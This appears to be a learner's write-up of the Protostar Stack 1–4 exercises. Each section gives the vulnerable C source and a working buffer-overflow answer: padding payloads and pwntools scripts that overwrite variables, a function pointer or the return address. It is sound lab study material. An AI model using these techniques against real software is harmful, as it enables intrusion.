# Notes and Answer
Notes while learning binary exploitation from protostar, YEA
## Stack 1 
- Source code
	
	```c
	#include <stdlib.h>
	#include <unistd.h>
	#include <stdio.h>
	#include <string.h>

	int main(int argc, char **argv)
	{
  	volatile int modified;
  	char buffer[64];

  	if(argc == 1) {
      	errx(1, "please specify an argument\n");
  	}

  	modified = 0;
  	strcpy(buffer, argv[1]);

  	if(modified == 0x61626364) {
      	printf("you have correctly got the variable to the right value\n");
  	} else {
      	printf("Try again, you got 0x%08x\n", modified);
  	}
	}
	```
- Answer

	```bash
	./stack1 AAAABBBBCCCCDDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKKLLLLMMMMNNNNOOOOPPdcba
	```

## Stack 2 
- Source Code
	
	```c
	#include <stdlib.h>
	#include <unistd.h>
	#include <stdio.h>
	#include <string.h>

	int main(int argc, char **argv)
	{
		volatile int modified;
		char buffer[64];
		char *variable;

		variable = getenv("GREENIE");

		if(variable == NULL) {
				errx(1, "please set the GREENIE environment variable\n");
		}

		modified = 0;

		strcpy(buffer, variable);

		if(modified == 0x0d0a0d0a) {
				printf("you have correctly modified the variable\n");
		} else {
				printf("Try again, you got 0x%08x\n", modified);
		}

	}
	```
- Answer 
	
	```python
	#!/bin/python
	import os
	from pwn import *

	pad = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa"
	modified = '\x0a\x0d\x0a\x0d'
	payload = pad+modified
	print(payload)

	os.environ['GREENIE']=payload

	p = process('./stack2')
	print(p.recvline())
	```


## Stack 3
- Source Code
	
	```c
	#include <stdlib.h>
	#include <unistd.h>
	#include <stdio.h>
	#include <string.h>

	void win()
	{
		printf("code flow successfully changed\n");
	}

	int main(int argc, char **argv)
	{
		volatile int (*fp)();
		char buffer[64];

		fp = 0;

		gets(buffer);

		if(fp) {
				printf("calling function pointer, jumping to 0x%08x\n", fp);
				fp();
		}
	}
	```
- Answer
	
	```python
	#!/bin/python
	from pwn import *
	pad = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa'
	eip = b'\x24\x84\x04\x08'#0x08048424
	payload = pad+eip

	p = process('./stack3')
	p.sendline(payload)
	print(p.recvline())

	print(p.recvline())
	```


## Stack 4
- Source Code 
	
	```c
	#include <stdlib.h>
	#include <unistd.h>
	#include <stdio.h>
	#include <string.h>

	void win()
	{
		printf("code flow successfully changed\n");
	}

	int main(int argc, char **argv)
	{
		char buffer[64];

		gets(buffer);
	}
	```
- Answer
		
	```python
	#!/bin/python
	from pwn import *

	pad = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaa'
	eip = p32(0x080483f4) #0x080483f4 win()

	payload = pad+eip
	p = process('./stack4')
	print('sending line')
	print(payload)
	p.sendline(payload)
	print(p.recv())
	```


